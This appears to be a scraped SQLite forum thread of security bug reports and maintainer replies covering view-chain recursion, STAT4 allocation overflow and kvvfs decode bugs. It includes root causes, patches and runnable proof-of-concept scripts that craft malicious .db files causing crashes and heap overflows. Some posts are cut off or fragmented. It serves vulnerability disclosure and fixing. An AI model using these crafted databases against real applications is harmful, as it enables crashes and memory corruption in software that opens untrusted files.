The buggy code iterates i over column indices. When i=2 (column r with REAL affinity), it applies RealAffinity to regData+2, which actually holds column n's large integer value. The correct register is regData+1 (storage index for column r).

Fix
Change line 321 from:
sqlite3VdbeAddOp1(v, OP_RealAffinity, pTop->regData+i);

to:
sqlite3VdbeAddOp1(v, OP_RealAffinity, pTop->regData+sqlite3TableColumnToStorage(pTab,i));

This follows the same pattern already used in resolve.c line 582-583 for correct excluded.* column-to-register mapping.

title: Vuln66-47: View Linear-Chain Stack Overflow via `selectExpander` -> `viewGetColumnNames` Mutual Recursion

posts.author: drh
posts.body: Fixed by check-in 3f3fb9b638f59ad9

posts.author: ylwang (yuelinwang)
posts.body:
Summary
selectExpander (src/select.c) and viewGetColumnNames (src/build.c) mutually recurse with no linear-depth guard. For a chain of N views where v_i references v_{i-1}, a single SELECT from the outermost view drives the call cycle:
selectExpander
→ sqlite3ViewGetColumnNames → viewGetColumnNames
→ sqlite3ResultSetOfSelect → sqlite3SelectPrep
→ sqlite3SelectExpand → selectExpander   ← back to A

The existing circular-reference guard (pTable->nCol = -1 at build.c:3171) only catches view cycles (V1 → V2 → V1); a strictly linear chain (V1 → V2 → … → VN → base_table) passes through every level without triggering it.

Unlike the trigger chain (Vuln65), all levels share the same Parse *pParse — no per-level sSubParse is allocated. The per-frame C stack cost is therefore smaller than in Vuln65, but the recursion is still unbounded. The fix for Vuln65 (commit 458dfb94d0, src/trigger.c only) does not touch this code path and leaves Vuln66 open.

The attack surface is wider than Vuln65: the crash is reached by a plain SELECT, requiring no write access to the database.

Attack Vector
An attacker supplies a crafted .db file containing a chain of N views. Any application that opens the file and compiles SELECT * FROM v_N — read-only, no INSERT or UPDATE — crashes inside sqlite3_prepare_v2.

PoC
Generate the malicious database (Python, 30 000-view chain, 2.3 MB):
import sqlite3, os

N = 30000
OUT = "/tmp/view_chain.db"
if os.path.exists(OUT):
os.remove(OUT)

con = sqlite3.connect(OUT)
cur = con.cursor()
cur.execute("PRAGMA journal_mode=OFF")
cur.execute("CREATE TABLE base (x INT)")
for i in range(1, N + 1):
ref = "base" if i == 1 else f"v{i-1}"
cur.execute(f"CREATE VIEW v{i} AS SELECT * FROM {ref}")
con.commit()
con.close()
print(f"[+] {OUT}: {N} views, {os.path.getsize(OUT)//1024} KB")

Trigger the crash (read-only SELECT, default stack):
sqlite3 /tmp/view_chain.db 'SELECT count(*) FROM v30000'

ASAN stack trace (repeating unit, confirmed against current HEAD on this machine):
#247 sqlite3ResultSetOfSelect   sqlite3.c:150634
#248 viewGetColumnNames         sqlite3.c:128747
#249 sqlite3ViewGetColumnNames  sqlite3.c:128772
#250 selectExpander             sqlite3.c:154163
#251 sqlite3WalkSelect          sqlite3.c:109395
#252 sqlite3SelectExpand        sqlite3.c:154501
#253 sqlite3SelectPrep          sqlite3.c:154583
#254 sqlite3ResultSetOfSelect   sqlite3.c:150634
#255 viewGetColumnNames         sqlite3.c:128747   ← repeats
...
SUMMARY: AddressSanitizer: stack-overflow

Fix
Add a view-nesting depth counter to Parse and check it on entry to viewGetColumnNames, mirroring the approach taken for triggers in commit 458dfb94d0.

In src/sqliteInt.h, add one field to struct Parse:
int nViewDepth;   /* view expansion nesting depth */

In src/build.c, at the top of viewGetColumnNames(), before the sqlite3ResultSetOfSelect call:
if( pParse->nViewDepth >= SQLITE_MAX_EXPR_DEPTH ){
sqlite3ErrorMsg(pParse, "view nesting too deep");
return 1;
}
pParse->nViewDepth++;
/* ... existing body ... */
pParse->nViewDepth--;

title: Vuln67-48: STAT4 loadStatTbl 32-bit size_t Multiplication Overflow Causes Heap Buffer Overflow

posts.author: ylwang (yuelinwang)
posts.body:
Summary
In src/analyze.c at loadStatTbl() lines 1817 to 1818, the per-index sample-buffer allocation widens to i64 only after the RHS multiplications, so on 32-bit builds both products evaluate in size_t (u32) and wrap before reaching nByte.
i64 nByte;
nByte  = ROUND8(sizeof(IndexSample) * nSample);                  /* 1817 wraps */
nByte += sizeof(tRowcnt) * nIdxCol * 3 * nSample;                /* 1818 wraps */
nByte += nIdxCol * sizeof(tRowcnt);
pIdx->aSample = sqlite3DbMallocZero(db, nByte);

On 32-bit sizeof(IndexSample) = 20 and sizeof(tRowcnt) = 8. With nIdxCol = 1000 and nSample = 179001 rows in sqlite_stat4, the second product is 8 * 1000 * 3 * 179001 = 4296024000, which truncates to 1056704 in u32. The widened nByte becomes about 4.4 MB, but the loop downstream writes the full 4.3 GB worth of samples. Commit fe15ed4342 previously widened nByte itself from int to i64 but left the RHS operands in size_t, so the wrap migrated one step upstream and is still present.

The bug is reachable through any .db file carrying a wide-index sqlite_stat4 table. sqlite_stat4 has no TF_Shadow flag and is freely writable from SQL, so an attacker can populate it directly. The victim needs only sqlite3_prepare_v2 on the table, since sqlite3AnalysisLoad runs during schema init before any user statement executes.

Requires SQLITE_ENABLE_STAT4 (non-default compile flag) and a 32-bit target.

PoC
Generate the database with a 32-bit STAT4 shell, then trigger on the same 32-bit ASAN+UBSan build:
# build the 32-bit STAT4 helper shell once
gcc -m32 -DSQLITE_ENABLE_STAT4 sqlite3.c shell.c \
-o /tmp/sqlite3_32_stat4 -ldl -lpthread -lm

# craft poc_stat4.db
python3 - <<'PY'
import subprocess
N, S = 999, 179001
cols = ", ".join(f"c{i}" for i in range(N))
nums = " ".join("1" for _ in range(N + 1))
sql = f"""
CREATE TABLE t({cols});
CREATE INDEX idx ON t({cols});
INSERT INTO t VALUES({", ".join("1" for _ in range(N))});
ANALYZE;
WITH RECURSIVE cnt(x) AS (SELECT 0 UNION ALL SELECT x+1 FROM cnt WHERE x<{S-1})
INSERT INTO sqlite_stat4(tbl,idx,neq,nlt,ndlt,sample)
SELECT 't','idx','{nums}','{nums}','{nums}',x'' FROM cnt;
"""
subprocess.run(["/tmp/sqlite3_32_stat4", "/tmp/poc_stat4.db"],
input=sql, text=True, check=True, timeout=600)
PY

# trigger
/data/ylwang/LargeScan/targets/sqlite/build32/sqlite3 /tmp/poc_stat4.db \
'SELECT c0 FROM t LIMIT 1' 2>&1 | tail -12

Trigger output:
==ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 8 at 0xf0405550 thread T0
#0 decodeIntArray
#1 loadStatTbl
#2 loadStat4
#3 sqlite3AnalysisLoad
#4 sqlite3InitOne
...
0xf0405550 is located 0 bytes to the right of 4668752-byte region [0xeff91800,0xf0405550)
SUMMARY: AddressSanitizer: heap-buffer-overflow in decodeIntArray

The 4668752-byte allocation is the wrapped value (~4.4 MB), and the WRITE at 0xf0405550 is exactly at the chunk boundary. UBSan also flags the pointer arithmetic earlier as runtime error: pointer index expression with base 0xfffff850 overflowed to 0x00001790.

Fix
Widen both RHS expressions to i64 before multiplication.
nByte  = ROUND8((i64)sizeof(IndexSample) * nSample);
nByte += (i64)sizeof(tRowcnt) * nIdxCol * 3 * nSample;

title: Bug69-50: FTS5 Content Table Creation Fails with Duplicate Column Name When locale=1 and nCol >= 115

posts.author: ylwang (yuelinwang)

int nDefn = 32 + pConfig->nCol*10;                                    /* 368 budget */

title: Bug71-52: kvvfsDecodeJournal Off-by-One in Base-26 Size Decode Causes Permanent Data Loss on Crash Recovery

posts.author: ylwang (yuelinwang)
posts.body:
Summary
src/os_kv.c:518, inside kvvfsDecodeJournal(), the base-26 size prefix is decoded with an off-by-one error. After i++ advances the index past the current character into c, the accumulation line reads zTxt[i] (already the next character) instead of c (the current digit):
while( (c = zTxt[i++]) >= 'a' && c <= 'z' ){
n += (zTxt[i] - 'a') * mult;   /* BUG: zTxt[i] is the next char, not c */
mult *= 26;
}

Because i is already incremented when zTxt[i] is read, every journal size decodes to a garbage value (~4 GB), sqlite3_malloc64 fails, journal recovery is silently skipped, and any data from an interrupted transaction is permanently lost.

PoC
Build:
gcc -DSQLITE_OS_KV_OPTIONAL \
sqlite3.c shell.c -o sqlite3_kvvfs -ldl -lpthread -lm

Run:
mkdir /tmp/kv && cd /tmp/kv

# Phase 1: commit data
./sqlite3_kvvfs 'file:local?vfs=kvvfs&mode=rwc' \
"CREATE TABLE t(x INTEGER); INSERT INTO t VALUES(42);"

# Phase 2: inject journal (simulate crash mid-transaction)
python3 -c "
hdr = bytes([0xd9,0xd5,0x05,0xf9,0x20,0xa1,0x63,0xd7,
0xff,0xff,0xff,0xff,0xde,0xad,0xbe,0xef,
0x00,0x00,0x00,0x01,0x00,0x00,0x02,0x00,
0x00,0x00,0x10,0x00])
print('cb ' + hdr.hex(), end='')
" > kvvfs-local-jrnl

# Phase 3: reopen -- journal recovery fires, bug triggers
./sqlite3_kvvfs 'file:local?vfs=kvvfs' "SELECT x FROM t;"

Output:
Parse error in 2nd command line argument: unknown error (59)

SQLITE_IOERR from failed malloc(~4 GB), row 42 is permanently inaccessible.

Fix/* os_kv.c:518 */
- n += (zTxt[i] - 'a') * mult;
+ n += (c - 'a') * mult;

posts.author: stephan
posts.body:
Thank you for the report!

The loop control variable usage is fixed in check-in a396d7c54c but this alone does not solve the issue. The output of your PoC is the same both with and without this fix, suggesting that there's still more work to do on kvvfs journaling.

Trivia: kvvfs's reason for existence is the JavaScript bindings, to store databases in JavaScript's localStorage and sessionStorage. We are unaware of anyone enabling it for any other purpose.

posts.author: ylwang (yuelinwang)
posts.body:
Thank you. After pulling a396d7c54c, two additional issues remain.

Issue 1: kvvfsReadJrnl:598 always returns an error on success

rc = sqlite3KvvfsMethods.xRcrdRead(..., aTxt, szTxt+1);  /* returns bytes read /
if( rc>=0 ){ kvvfsDecodeJournal(...); }
sqlite3_free(aTxt);
if( rc ) return rc;    / BUG: rc = bytes-read (positive), always true */

xRcrdRead returns the number of bytes read on success, not 0. So
"if( rc )" fires on every successful read and returns the byte count as
an error code, aborting journal recovery regardless of whether decoding
succeeded.

Fix: replace with "if( rc<0 ) return SQLITE_IOERR;"

Issue 2: kvvfsClose does not NULL pFile->aJrnl in non-WASM builds

After applying the Issue 1 fix, ASAN reports heap-use-after-free in
kvvfsReadJrnl (memcpy at line 39899). kvvfsClose frees pFile->aJrnl but
only zeros the struct under #ifdef SQLITE_WASM. In non-WASM builds the
pointer is left dangling. When the pager later reuses the same KVVfsFile
without calling kvvfsOpen, kvvfsReadJrnl finds pFile->aJrnl != NULL,
skips the allocation, and does memcpy from freed memory.

Fix: set pFile->aJrnl = 0 and pFile->aData = 0 in kvvfsClose
unconditionally (outside the SQLITE_WASM guard):

sqlite3_free(pFile->aJrnl);  pFile->aJrnl = 0;
sqlite3_free(pFile->aData);  pFile->aData = 0;
#ifdef SQLITE_WASM
memset(pFile, 0, sizeof(*pFile));
#endif

posts.body: And the mult maybe causes integer overflow. Maybe it needs to be changed to i64?

title: Bug72-53: Integer Overflow in src/os_kv.c kvvfsDecode Zero-Run Counter Bypasses Bounds Check for Heap Buffer Overflow

posts.author: stephan

kvvfsDecode Zero-Run Counter Bypasses Bounds Check

This is fixed in check-in c36fc5df62.

Thank you again for your detailed report and PoC :).

posts.author: ylwang (yuelinwang)
posts.body:
Summary
In src/os_kv.c at kvvfsDecode() lines 471–481, n and mult are int, so 7 consecutive 'z' base-26 digits overflow n to −558,124,417, silently bypassing the guard if(j+n>nOut) and passing that negative value to memset where it is cast to size_t (~18 EiB), causing a heap-buffer-overflow during sqlite3_open on any -DSQLITE_OS_KV_OPTIONAL build (standard for WASM).

-I. sqlite3.c shell.c -o sqlite3_kvvfs -ldl -lpthread -lm

printf '4096'    > kvvfs-local-sz
printf 'zzzzzzz' > kvvfs-local-1

"file:local?vfs=kvvfs" "SELECT 1;"

=================================================================
==PID==ERROR: AddressSanitizer: negative-size-param: (size=-558124417)
#0 __interceptor_memset sanitizer_common_interceptors.inc:799
#1 kvvfsDecode          sqlite3.c:39776
#2 kvvfsReadDb          sqlite3.c:39942
#3 sqlite3OsRead        sqlite3.c:27508
#4 sqlite3PagerReadFileheader sqlite3.c:62574
#5 sqlite3BtreeOpen     sqlite3.c:74897
#6 openDatabase         sqlite3.c:190323
#7 sqlite3_open_v2      sqlite3.c:190446
#8 open_db              shell.c:29508
#9 runOneSqlLine        shell.c:37458
#10 main                 shell.c:38731

0x...fd8 is located 2008 bytes inside of 133088-byte region [...]
allocated by thread T0 here:
#0 __interceptor_malloc
...
#4 sqlite3_malloc64     sqlite3.c:31900
#5 kvvfsOpen            sqlite3.c:40226

SUMMARY: AddressSanitizer: negative-size-param in __interceptor_memset
